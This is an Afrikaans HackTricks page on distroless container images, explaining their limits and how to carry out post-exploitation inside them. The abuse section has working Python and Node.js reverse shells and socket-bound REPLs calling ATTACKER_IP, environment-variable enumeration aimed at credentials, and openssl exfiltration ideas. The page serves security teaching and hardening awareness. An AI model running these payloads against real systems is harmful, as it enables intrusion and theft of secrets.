# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

’n **distroless** container-image bevat die **minimum runtime-komponente wat nodig is om een spesifieke toepassing te laat loop**, terwyl die gewone distribusie-nutsgoed, soos pakketbestuurders, shells en groot versamelings algemene userland-nutsprogramme, doelbewus verwyder word. In die praktyk bevat distroless-images dikwels slegs die toepassing se binary of runtime, sy gedeelde biblioteke, sertifikaatbundels en ’n baie klein lêerstelseluitleg. <sup>[[1]](#references)</sup>

Die punt is nie dat distroless ’n nuwe kernel-isolasieprimitive is nie. Distroless is ’n **image-ontwerpstrategie**. Dit verander wat **binne** die container-lêerstelsel beskikbaar is, nie hoe die kernel die container isoleer nie. Daardie onderskeid is belangrik, want distroless verhard die omgewing hoofsaaklik deur te beperk wat ’n aanvaller kan gebruik nadat hy code execution verkry het. Dit vervang nie namespaces, seccomp, capabilities, AppArmor, SELinux of enige ander runtime-isolasiemeganisme nie.

## Waarom Distroless bestaan

Distroless-images word hoofsaaklik gebruik om die volgende te verminder:

- die image-grootte
- die operasionele kompleksiteit van die image
- die aantal pakkette en binaries wat kwesbaarhede kan bevat
- die aantal post-exploitation-nutsgoed wat by verstek vir ’n aanvaller beskikbaar is

Daarom is distroless-images gewild in produksietoepassingsontplooiings. ’n Container wat geen shell, geen pakketbestuurder en byna geen algemene nutsgoed bevat nie, is gewoonlik makliker om operasioneel te verstaan en moeiliker om ná ’n kompromittering interaktief te misbruik.

Voorbeelde van bekende distroless-styl image-families sluit in:

- Google se distroless-images <sup>[[1]](#references)</sup>
- Chainguard se hardened/minimal-images <sup>[[2]](#references)</sup>

## Wat Distroless nie beteken nie

’n Distroless-container is **nie**:

- outomaties rootless nie
- outomaties nie-bevoorreg nie
- outomaties leesalleen nie
- outomaties deur seccomp, AppArmor of SELinux beskerm nie
- outomaties veilig teen container escape nie

Dit is steeds moontlik om ’n distroless-image met `--privileged`, gedeelde host-namespaces, gevaarlike bind mounts of ’n gemounte runtime-socket te laat loop. In daardie scenario is die image dalk minimaal, maar die container kan steeds katastrofies onveilig wees. Distroless verander die **userland-aanvalsoppervlak**, nie die **kernel-vertrouensgrens** nie.

## Tipiese operasionele eienskappe

Wanneer jy ’n distroless-container kompromitteer, is die eerste ding wat jy gewoonlik opmerk dat algemene aannames nie meer geld nie. Daar is dalk geen `sh`, geen `bash`, geen `ls`, geen `id`, geen `cat` nie, en soms selfs nie ’n libc-gebaseerde omgewing wat werk soos jou gewone tradecraft verwag nie. Dit beïnvloed sowel aanval as verdediging, want die gebrek aan nutsgoed maak debugging, insidentreaksie en post-exploitation anders.

Die algemeenste patrone is:

- die toepassing se runtime is beskikbaar, maar daar is min anders
- shell-gebaseerde payloads misluk omdat daar geen shell is nie
- algemene enumerasie-one-liners misluk omdat die helper-binaries ontbreek
- lêerstelselbeskermings, soos ’n leesalleen rootfs of `noexec` op skryfbare tmpfs-liggings, is dikwels ook teenwoordig

Hierdie kombinasie is gewoonlik die rede waarom mense praat van “distroless bewapen”.

## Distroless en Post-Exploitation

Die grootste aanvallende uitdaging in ’n distroless-omgewing is nie altyd die aanvanklike RCE nie. Dit is dikwels wat daarna kom. As die uitgebuite workload code execution in ’n taal-runtime soos Python, Node.js, Java of Go bied, kan jy dalk arbitrêre logika uitvoer, maar nie deur die gewone shell-gesentreerde werksvloeie wat algemeen op ander Linux-teikens is nie.

Dit beteken dat post-exploitation dikwels in een van drie rigtings beweeg:

1. **Gebruik die bestaande taal-runtime direk** om die omgewing te enumereer, sockets oop te maak, lêers te lees of bykomende payloads te staged.
2. **Bring jou eie nutsgoed in die geheue in** as die lêerstelsel leesalleen is of skryfbare liggings met `noexec` gemoun is.
3. **Misbruik bestaande binaries wat reeds in die image teenwoordig is** as die toepassing of sy dependencies iets onverwags nuttigs insluit.

## Misbruik

### Enumereer die Runtime wat jy reeds het

In baie distroless-containers is daar geen shell nie, maar wel ’n toepassing se runtime. As die teiken ’n Python-diens is, is Python daar. As die teiken Node.js is, is Node daar. Dit bied dikwels genoeg funksionaliteit om lêers te enumereer, omgewingsveranderlikes te lees, reverse shells oop te maak en in-geheue-uitvoering te staged sonder om ooit `/bin/sh` aan te roep.

’n Eenvoudige voorbeeld met Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

’n Eenvoudige voorbeeld met Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impak:

- herwinning van omgewingsveranderlikes, wat dikwels credentials of diens-eindpunte insluit
- lêerstelsel-enumerasie sonder `/bin/ls`
- identifisering van skryfbare paaie en gemonteerde secrets

### Interaktiewe Runtime Sonder `/bin/sh`

As die image nie `sh` of `bash` bevat nie, sal ’n klassieke shell-gebaseerde reverse shell misluk. Stel in daardie geval ’n interaktiewe sessie in die geïnstalleerde taalruntime beskikbaar, eerder as om ’n shell te probeer begin wat nie bestaan nie.

Byvoorbeeld, hierdie Python-payload herlei ’n interaktiewe Python-konsole oor ’n socket:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Die ekwivalente Node.js-benadering kan JavaScript evalueer wat oor ’n socket ontvang word. Dit is ’n JavaScript-REPL, nie ’n bedryfstelseldop nie; lêerstelsel-, proses- en netwerkbewerkings moet deur Node se API’s uitgevoer word:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Albei voorbeelde vereis uitgaande konnektiwiteit en ’n beskikbare interpreter, en albei bied slegs die funksionaliteit wat deur daardie interpreter blootgestel word.

As die image onverwags `/bin/sh` insluit, bly die klassieke interpreter-ondersteunde shell payloads nuttig. Hulle word apart gewys omdat hulle nie werklik shell-free is nie:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Die ouer Python command-loop-patroon is ook nuttig wanneer `/bin/sh` bestaan, maar ’n interaktiewe PTY ongerieflik is. Dit word hier behou met die werklike afhanklikheid daarvan uitdruklik vermeld: `subprocess.run(..., shell=True)` roep die stelseldop aan en is dus **nie** ’n no-shell-tegniek nie.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Volledige voorbeeld: Python-opdraglus sonder shell

As die image Python het, maar glad nie ’n shell nie, kan ’n plaaslike Python REPL steeds inspeksie van die lêerstelsel, omgewing en netwerk ondersteun:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Hierdie lus roep nie `/bin/sh` aan nie. Dit evalueer Python-uitdrukkings en -stellings direk, dus moet bewerkings Python-API’s gebruik eerder as shell-opdragte. Selfs met dié beperking kan dit steeds baie van die vermoëns van ’n basiese shell bied: lêerstelsel- en omgewingsverkenning, toegang tot data, netwerkaktiwiteit en die staging van verdere payloads deur die geïnstalleerde runtime.

### Uitvoering van gereedskap in die geheue

Distroless-images word dikwels gekombineer met:

- `readOnlyRootFilesystem: true`
- ’n skryfbare maar `noexec`-tmpfs soos `/dev/shm`
- ’n gebrek aan pakketbestuurnutsgoed

Dié kombinasie maak klassieke werkvloeie van “laai binêr af na skyf en voer dit uit” onbetroubaar. In sulke gevalle word geheue-uitvoeringstegnieke die belangrikste oplossing.

Die toegewyde bladsy hiervoor is:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die tegnieke daar wat die relevantste is:

- `memfd_create` + `execve` via scripting-runtimes <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Vir ’n Python-, Node.js- of PHP-diens kan die toegangspunt ’n toepassingsfout wees, soos template injection, prototype pollution of onveilige evaluering. As dit kode-uitvoering binne die proses moontlik maak, kan ’n `/proc/self/mem`-tegniek ’n loader uitvoer sonder ’n shell of uitvoerbare lêer op skyf. Dit bly uitvoering onder die identiteit van die container-proses; ’n afsonderlike swakheid in die runtime- of gasheergrens is nodig om uit die container te ontsnap. Sien die [read-only/noexec/distroless-tegnieke](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) vir die voorvereistes.

### Bestaande binêre lêers wat reeds in die image is

Sommige distroless-images bevat steeds binêre lêers wat operasioneel nodig is en ná ’n kompromittering nuttig word. ’n Voorbeeld wat herhaaldelik waargeneem is, is `openssl`, omdat toepassings dit soms vir kriptografie- of TLS-verwante take nodig het.

’n Vinnige soekpatroon is:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

As `openssl` teenwoordig is, kan dit moontlik gebruik word vir:

- uitgaande TLS-verbindings
- data exfiltration oor ’n toegelate egress-kanaal
- payload-data staging deur geënkodeerde/versleutelde blobs

Die presiese misbruik hang af van wat werklik geïnstalleer is, maar die algemene idee is dat distroless nie "glad geen tools" beteken nie; dit beteken "baie minder tools as ’n normale distribution image".

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die image in die praktyk werklik distroless is en watter runtime- of helper-binaries steeds vir post-exploitation beskikbaar is.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Wat hier interessant is:

- As daar geen shell bestaan nie, maar ’n runtime soos Python of Node teenwoordig is, behoort post-exploitation oor te skakel na runtime-gedrewe uitvoering.
- As die root filesystem leesalleen is en `/dev/shm` skryfbaar maar `noexec` is, word tegnieke vir geheue-uitvoering baie meer relevant.
- As helper-binaries soos `openssl`, `busybox` of `java` bestaan, kan hulle genoeg funksionaliteit bied om verdere toegang te bewerkstellig.

## Verstekinstellings vir runtimes

| Image-/platformstyl | Verstektoestand | Tipiese gedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Google distroless-style images | Minimal userland by ontwerp | Geen shell, geen package manager nie; slegs toepassings-/runtime-afhanklikhede | voeg debugging-lae of sidecar-shells by, of kopieer busybox of tools in |
| Chainguard minimal images | Minimal userland by ontwerp | Verminderde package-oppervlak, dikwels gefokus op een runtime of diens | gebruik `:latest-dev` of debug-variante, of kopieer tools tydens die build |
| Kubernetes-werkladings wat distroless images gebruik | Hang af van Pod-konfigurasie | Distroless beïnvloed net userland; die Pod-sekuriteitsposisie hang steeds af van die Pod-spesifikasie en runtime-verstekinstellings | voeg tydelike debug-containers, host-mounts of bevoorregte Pod-instellings by |
| Docker / Podman wat distroless images gebruik | Hang af van run-vlae | Minimale filesystem, maar runtime-sekuriteit hang steeds af van vlae en daemon-konfigurasie | `--privileged`, deel host-naamruimtes, mount runtime-sockets of gebruik skryfbare host-bind-mounts |

Die kernpunt is dat distroless ’n **image-eienskap** is, nie runtime-beskerming nie. Die waarde daarvan kom van die vermindering van wat ná ’n kompromittering binne die filesystem beskikbaar is. Multi-stage builds is ’n algemene manier om build-tools uit die finale image te hou. <sup>[[3]](#references)</sup>

## Verwante bladsye

Vir filesystem- en geheue-uitvoeringsbypasses wat dikwels in distroless-omgewings nodig is:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Vir misbruik van container runtimes, sockets en mounts wat steeds op distroless-werkladings van toepassing is:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distroless-houerbeelde](https://github.com/GoogleContainerTools/distroless)
- [2] [Chainguard Images-dokumentasie](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Meerstadium-bouwerk](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
